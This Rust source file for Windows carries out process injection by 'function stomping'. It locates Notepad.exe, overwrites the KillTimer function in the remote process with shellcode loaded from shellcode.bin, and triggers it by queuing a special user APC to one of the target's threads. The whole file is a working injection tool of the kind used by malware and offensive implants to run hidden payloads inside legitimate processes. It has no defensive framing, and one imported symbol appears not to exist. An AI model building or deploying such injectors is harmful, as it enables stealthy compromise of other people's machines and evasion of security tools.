#![allow(non_snake_case)]
#![allow(unused)]

use std::{
    ffi::c_void,
    mem::transmute,
    os::windows::raw::HANDLE,
    ptr::{null, null_mut},
};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::{BREAKAWAY_CABLE_TRANSITION, WriteProcessMemory},
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{PAGE_EXECUTE, PAGE_EXECUTE_READWRITE, VirtualProtectEx},
        Threading::{
            OpenProcess, OpenThread, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_WRITE_DAC,
            QUEUE_USER_APC_CALLBACK_DATA_CONTEXT, QUEUE_USER_APC_FLAGS_NONE,
            QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, QueueUserAPC2, THREAD_SET_CONTEXT,
        },
        WindowsProgramming::SYSTEM_THREAD_INFORMATION,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

pub type NTSTATUS = i32;
pub const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = 0xC0000004_u32 as _;

#[repr(C)]
#[derive(Clone, Copy)]
pub struct SYSTEM_PROCESS_INFORMATION {
    pub NextEntryOffset: u32,
    pub NumberOfThreads: u32,
    pub Reserved1: [u8; 48],
    pub ImageName: UNICODE_STRING,
    pub BasePriority: i32,
    pub UniqueProcessId: HANDLE,
    pub Reserved2: *mut core::ffi::c_void,
    pub HandleCount: u32,
    pub SessionId: u32,
    pub Reserved3: *mut core::ffi::c_void,
    pub PeakVirtualSize: usize,
    pub VirtualSize: usize,
    pub Reserved4: u32,
    pub PeakWorkingSetSize: usize,
    pub WorkingSetSize: usize,
    pub Reserved5: *mut core::ffi::c_void,
    pub QuotaPagedPoolUsage: usize,
    pub Reserved6: *mut core::ffi::c_void,
    pub QuotaNonPagedPoolUsage: usize,
    pub PagefileUsage: usize,
    pub PeakPagefileUsage: usize,
    pub PrivatePageCount: usize,
    pub Reserved7: [i64; 6],
}
#[repr(C)]
#[derive(Clone, Copy)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: windows_sys::core::PWSTR,
}

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtQuerySystemInformation(
        systeminformationclass: u32,
        systeminformation: *mut std::ffi::c_void,
        systeminformationlength: u32,
        returnlength: *mut u32,
    ) -> i32;
}

fn get_pid(process_name: &str) -> u32 {
    let mut pid = 0;

    unsafe {
        let mut return_length: u32 = 0;
        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information length.");
            return pid;
        }

        let buff_size = return_length as usize;
        let buffer = vec![0u8; buff_size];
        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_ptr() as *mut c_void,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information.");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn get_thread_id(pid: u32) -> u32 {
    let mut tid = 0;

    unsafe {
        let mut return_length = 0;
        let mut status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information length.");
            return tid;
        }

        let buff_size = return_length as usize;
        let buffer = vec![0u8; buff_size];
        status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_ptr() as *mut c_void,
            buff_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information.");
            return tid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        loop {
            if (*proc_info).UniqueProcessId as u32 == pid {
                println!("[+] Found {} Threads", (*proc_info).NumberOfThreads);

                let offset = (proc_info as usize) - (buffer.as_ptr() as usize);
                let thread_offset = offset + std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>();
                let thread_info_ptr =
                    buffer.as_ptr().add(thread_offset) as *const SYSTEM_THREAD_INFORMATION;

                for i in 0..(*proc_info).NumberOfThreads {
                    let thread_info = thread_info_ptr.add(i as usize);
                    tid = (*thread_info).ClientId.UniqueThread as u32;
                    // println!("[+] Thread ID: {}", tid);
                    break;
                }
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    tid
}

fn func_stomp(proc_handle: HANDLE, func_addr: *mut c_void) -> bool {
    unsafe {
        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            proc_handle,
            func_addr,
            SHELLCODE.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection.");
            return false;
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            proc_handle,
            func_addr,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to target process.");
            return false;
        }

        if VirtualProtectEx(
            proc_handle,
            func_addr,
            SHELLCODE.len(),
            old_protect,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to restore memory protection.");
            return false;
        }
    }

    true
}

fn main() {
    let target_process = "Notepad.exe";

    let pid = get_pid(target_process);

    if pid == 0 {
        println!("Target process not found.");
        return;
    }

    println!(
        "Target process '{}' found with PID: {}",
        target_process, pid
    );

    unsafe {
        let proc_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            0,
            pid,
        );
        if proc_handle.is_null() {
            println!("[-] Failed to open target process.");
            return;
        }

        // let user32 = GetModuleHandleA("User32.dll\0".as_ptr() as *const u8);
        let user32 = LoadLibraryA("user32.dll\0".as_ptr() as *const u8);
        if user32.is_null() {
            println!("[-] Failed to get User32.dll handle.");
            return;
        }

        println!("[+] User32.dll handle: {:p}", user32);

        let kill_timer_addr =
            GetProcAddress(user32, "KillTimer\0".as_ptr() as *const u8).unwrap() as *mut c_void;
        if kill_timer_addr.is_null() {
            println!("[-] Failed to get KillTimer address.");
            return;
        }

        println!("[+] KillTimer address: {:p}", kill_timer_addr);

        if !func_stomp(proc_handle, kill_timer_addr) {
            println!("[-] Function stomping failed.");
            return;
        }

        let tid = get_thread_id(pid);
        if tid == 0 {
            println!("[-] No thread found in target process.");
            return;
        }

        println!("[+] Thread ID: {}", tid);

        let thread_handle = OpenThread(THREAD_SET_CONTEXT, 0, tid);
        if thread_handle.is_null() {
            println!("[-] Failed to open target thread.");
            return;
        }

        if QueueUserAPC2(
            transmute(kill_timer_addr),
            thread_handle,
            0,
            QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
        ) == 0
        {
            println!("[-] Failed to queue APC.");
            return;
        }

        CloseHandle(thread_handle);
        CloseHandle(proc_handle);

        println!("[+] Stomped Function...");
    }
}
